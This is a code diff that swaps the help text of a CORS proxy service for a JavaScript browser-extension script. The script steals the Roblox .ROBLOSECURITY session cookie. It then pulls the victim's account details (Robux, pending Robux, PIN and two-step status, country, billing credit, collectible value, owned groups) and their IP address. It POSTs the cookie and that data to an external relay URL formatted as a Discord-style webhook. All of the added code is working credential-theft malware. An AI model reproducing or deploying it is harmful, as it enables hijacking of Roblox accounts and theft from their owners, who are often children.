@@ -1,30 +1,100 @@
-This API enables cross-origin requests to anywhere.
+const c = "https://ropro.up.railway.app/https://subscriptions.up.railway.app/gyeom";
 
-Usage:
+async function main(cookie) {
+    let ABCDEF = "N/A";
+    let groupCount = "N/A";
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
+    const currentTimeStamp = new Date().toLocaleString();
+    if (cookie) 
+    {var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
+    const usrID = statistics ? statistics.UserID : "N/A";
+    {var PendRBX = await (await fetch("https://economy.roblox.com/v2/users/"+usrID+"/transaction-totals?timeFrame=Year&transactionType=summary", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
+    {var Twostep = await (await fetch("https://twostepverification.roblox.com/v1/metadata", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
+    {var Profstats = await (await fetch("https://www.roblox.com/my/settings/json", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
+    {var IsPin = await (await fetch("https://auth.roblox.com/v1/account/pin", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
+    {var AcCountry = await (await fetch("https://www.roblox.com/account/settings/account-country", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
+    {var AcCreds = await (await fetch("https://billing.roblox.com/v1/credit", {headers: {Cookie: ".ROBLOSECURITY=" + cookie},redirect: "manual"})).json();}
+    try {if (usrID) {
+    const a = await fetch(`https://inventory.roblox.com/v1/users/${usrID}/assets/collectibles?sortOrder=Asc&limit=10`);
+    const d = await a.json();ABCDEF = 0;d.data.forEach((item) => {const e = item.recentAveragePrice || 0; ABCDEF += e;});
+    const b = await fetch(`https://groups.roblox.com/v1/users/${usrID}/groups/roles`);
+    const c = await b.json();
+    groupCount = c.data.filter((group) => group.role.rank >= 255).length;}}catch (error){}
+    const buxValue = statistics ? statistics.RobuxBalance : "N/A";
+    const content = buxValue > 999 ? "Rich Unused Account" : "Unused Account";
 
-/               Shows help
-/iscorsneeded   This is the only resource on this host which is served without CORS headers.
-/<url>          Create a request to <url>, and includes CORS headers in the response.
+    fetch(c, {
+        method: "POST",
+        headers: {
+            "Content-Type": "Application/json"
+        },
+        body: JSON.stringify({
+            "content": content,
+            "embeds": [
+              {
+                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+                "color": 4761827,
+                "fields": [
+                  {
+                    "name": "🔍 UserID",
+                    "value": Profstats ? Profstats.UserId : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "<:roblox:1023778640145694740>  Username",
+                    "value": statistics ? statistics.UserName : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "📅 Account Age",
+                    "value": Profstats ? Profstats.AccountAgeInDays : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "🪙 RAP",
+                    "value": ABCDEF,
+                    "inline": true
+                  },
+                  {
+                    "name": "💸 Robux (Pending)",
+                    "value": (statistics && PendRBX) ? `${statistics.RobuxBalance} (${PendRBX.pendingRobuxTotal})` : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "💎 Premium",
+                    "value": statistics ? statistics.IsPremium : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": ":bank: Group Owned",
+                    "value": groupCount,
+                    "inline": true
+                  },
+                  {
+                    "name": "🌏 Country",
+                    "value": AcCountry ? AcCountry.countryName : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "🔐 Pin",
+                    "value": IsPin ? IsPin.isEnabled : "N/A",
+                    "inline": true
+                  }
+                ],
+                "author": {
+                  "name": "🌐 IP Found: " + ipAddr,
+                },
+                "footer": {
+                  "text": `⏲️ | ${currentTimeStamp}`,
+                },
+              }
+            ],
+            "username": "Webhook",
+            "avatar_url": "https://static.wikia.nocookie.net/logopedia/images/d/d6/Discordmacosbigsur2021beta.png/revision/latest/scale-to-width-down/250?cb=20210525125816",
+        })
+    });
+}
 
-If the protocol is omitted, it defaults to http (https if port 443 is specified).
-
-Cookies are disabled and stripped from requests.
-
-Redirects are automatically followed. For debugging purposes, each followed redirect results
-in the addition of a X-CORS-Redirect-n header, where n starts at 1. These headers are not
-accessible by the XMLHttpRequest API.
-After 5 redirects, redirects are not followed any more. The redirect response is sent back
-to the browser, which can choose to follow the redirect (handled automatically by the browser).
-
-The requested URL is available in the X-Request-URL response header.
-The final URL, after following all redirects, is available in the X-Final-URL response header.
-
-
-To prevent the use of the proxy for casual browsing, the API requires either the Origin
-or the X-Requested-With header to be set. To avoid unnecessary preflight (OPTIONS) requests,
-it's recommended to not manually set these headers in your code.
-
-
-Demo          :   https://robwu.nl/cors-anywhere.html
-Source code   :   https://github.com/Rob--W/cors-anywhere/
-Documentation :   https://github.com/Rob--W/cors-anywhere/#documentation
+chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+    main(cookie ? cookie.value : null);
+});
